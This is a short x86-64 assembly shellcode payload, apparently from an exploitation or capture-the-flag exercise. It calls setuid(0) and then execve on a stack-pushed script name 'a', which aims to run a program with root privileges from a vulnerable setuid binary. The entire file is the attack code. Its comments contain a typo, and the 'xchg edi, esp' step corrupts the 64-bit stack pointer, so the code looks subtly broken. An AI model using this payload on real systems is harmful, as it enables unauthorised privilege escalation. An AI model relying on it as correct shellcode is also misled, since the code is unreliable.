.global _start
_start:
.intel_syntax noprefix

#SETUID
    mov al, 105
    xor edi, edi
    syscall

    
#CALL evecve (syscall 59)
    #rax = 59
    #rdi = rsp
    #rsi = 0
    #rdx = 0

    mov al, 59
    xor esi, esi    
    xor edx, edx

#a = script name
#MOVE a TO STACK
    push 0x61

    xchg edi, esp

    syscall
